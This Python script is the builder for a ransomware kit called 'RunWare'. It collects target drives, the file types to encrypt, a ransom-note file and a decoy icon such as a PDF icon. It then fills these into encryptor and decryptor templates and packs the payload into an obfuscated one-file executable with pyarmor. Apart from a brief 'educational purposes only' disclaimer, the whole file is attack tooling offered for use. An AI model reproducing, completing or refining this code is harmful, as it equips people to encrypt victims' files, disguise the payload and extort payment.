import os
import platform
import base64
import datetime
import shutil
from colorama import Fore

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE


class Generator:
    def __init__(self):
        self.configuration = {}
        self.configuration['key'] = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
        self.configuration['disk'] = []
        self.configuration['fname'] = ""
        self.configuration['ext'] = ""
        self.configuration['icon'] = ""
        self.configuration['t_ext'] = []
        self.configuration['readme'] = ""

        self.interact()

        self.createFile()

    def clear(self):
        operating_system = platform.system()
        if "indows" in operating_system:
            os.system("cls")
        elif "inux" in operating_system:
            os.system("clear")
        else:
            pass

        print(f"""{red}

             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$*   *$$$*   *$$$$$$u
       *$$$$*      u$u       $$$$*
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         *$$$$uu$$$   $$$uu$$$$*
          *$$$$$$$*   *$$$$$$$*
            u$$$$$$$u$$$$$$$u
             u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$       $$$$$u$u$u$$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$**
     $$$*                         $$$$*
{white}RunWare - Simple Ransomware Generator 
    by {red}@N4tzzSquadCommunity

{white}({red}*{white}) Disclaimer {white} : This tool is for educational purposes only! I am not responsible for any harmful actions taken with this tool. Use responsibly!

""")

    def interact(self):
        self.clear()

        print(f"[{red}REQUIRED{white}] Insert disk or target folder\nexample: E:,D:,C:\\users\\Administrator\\Documents\n")
        tdisk = str(input("-> "))
        self.configuration['disk'] = tdisk.split(",")

        self.clear()

        # Ransom name
        print(f"[{red}REQUIRED{white}] Insert Filename\nexample: prize\n")
        self.configuration['fname'] = str(input("-> "))

        # Extension
        print(f"[{red}REQUIRED{white}] Insert extension for encrypted files\nwhen file encrypted, there will be automatically changed the extension data.docx to data.docx.your_extension\nexample: .encrypted")
        self.configuration['ext'] = str(input("-> "))

        self.clear()

        # Icon
        print(f"[{red}REQUIRED{white}] Insert Icon\nexample: icons/pdf.ico\n")
        self.configuration['icon'] = str(input("-> "))

        self.clear()

        print(f"[{red}REQUIRED{white}] Insert target file extension\nexample: .docx,.pdf,.jpg,.mp4\n")
        target_ext = str(input("-> "))
        self.configuration['t_ext'] = target_ext.split(",")

        self.clear()

        print(f"[{red}REQUIRED{white}] Insert readme file\nexample: lib/readme.txt\n")
        r_in = str(input("-> "))
        self.configuration['readme'] = open(r_in, "r").read()

    def createFile(self):
        pwd = os.getcwd()
        date = str(datetime.datetime.now().date())
        fout = os.path.join(pwd, "output", date)
        f_encryptor = fout + "/" + self.configuration['fname'] + ".py"
        f_decryptor = fout + "/decryptor_" + self.configuration['fname'] + ".py"
        try:
            os.mkdir("output")
            os.mkdir(fout)
        except:
            pass

        with open("lib/source.py", "r") as f:
            read = f.read()
            cofig = read.replace("##key##", self.configuration['key'])
            cofig = cofig.replace("##disk##", str(self.configuration['disk']))
            cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
            cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
            cofig = cofig.replace("##readme##", str(self.configuration['readme']))
            open(f_encryptor, "w").write(cofig)

        with open("lib/source_de.py", "r") as f:
            read = f.read()
            cofig = read.replace("##key##", self.configuration['key'])
            cofig = cofig.replace("##disk##", str(self.configuration['disk']))
            cofig = cofig.replace("##enc_extension##", str(self.configuration['ext']))
            cofig = cofig.replace("##file_to_enc##", str(self.configuration['t_ext']))
            open(f_decryptor, "w").write(cofig)

        # GENERATE KEY
        open(fout + "/" + "KEY.txt", "w").write(self.configuration['key'])

        # FOR ENCRYPTOR
        os.system(f"pyarmor gen --pack onefile {f_decryptor} --output {fout}")
        os.system(f'pyarmor cfg pack:pyi_options + " -i {self.configuration["icon"]} --target-architecture universal2" ')
        os.system(f"pyarmor gen --pack onefile {f_encryptor} --output {fout}")

        # CLEAR TEMPORARY FILES AND DIRECTORY
        os.remove(f"./{self.configuration['fname']}.spec")
        os.remove(f"./decryptor_{self.configuration['fname']}.spec")
        shutil.rmtree("./dist")
        shutil.rmtree("./.pyarmor")

        # KEY
        self.clear()
        print(f"""



        {red}KEY  : {green}{self.configuration['key']}{red}
        {red}Output : {green}{fout}{red}
        {yellow}Please don't lose the KEY !
""")


Generator()
